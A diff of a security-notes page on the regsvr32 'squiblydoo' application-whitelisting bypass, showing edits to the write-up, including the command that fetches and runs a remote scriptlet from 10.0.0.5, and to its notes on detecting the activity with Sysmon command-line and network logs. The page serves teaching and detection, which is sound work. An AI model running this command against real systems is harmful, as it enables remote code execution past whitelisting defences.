@@ -7,7 +7,7 @@ description: regsvr32 (squiblydoo) code execution - bypass application whitelist
 ## Execution
 
 {% code-tabs %}
-{% code-tabs-item title="back.sct" %}
+{% code-tabs-item title="http://10.0.0.5/back.sct" %}
 ```markup
 <?XML version="1.0"?>
 <scriptlet>
@@ -25,11 +25,11 @@ description: regsvr32 (squiblydoo) code execution - bypass application whitelist
 {% endcode-tabs-item %}
 {% endcode-tabs %}
 
-We need to host the back.sct somehwere on a web server and then we can then execute the above code from the command prompt:
+We need to host the back.sct on a web server so we can invoke it like so:
 
 {% code-tabs %}
 {% code-tabs-item title="attacker@victim" %}
-```bash
+```csharp
 regsvr32.exe /s /i:http://10.0.0.5/back.sct scrobj.dll
 ```
 {% endcode-tabs-item %}
@@ -39,11 +39,11 @@ regsvr32.exe /s /i:http://10.0.0.5/back.sct scrobj.dll
 
 ![calc.exe spawned by regsvr32.exe](../.gitbook/assets/regsvr32.png)
 
-Note how regsvr32 process exits almost immediately. This means that just by looking at the list of processes on the victim machine, an evil process may not be immedialy evident... Not until you realise how it was invoked though. Sysmon commandline parameters will show what you need to see:
+Note how regsvr32 process exits almost immediately. This means that just by looking at the list of processes on the victim machine, the evil process may not be immedialy evident... Not until you realise how it was invoked though. Sysmon commandline logging may help you detect this activity:
 
 ![](../.gitbook/assets/regsvr32-commandline.png)
 
-Additionally, sysmon will show regsvr32 establishing a network connection:
+Additionally, of course sysmon will show regsvr32 establishing a network connection:
 
 ![](../.gitbook/assets/regsvr32-network.png)
 
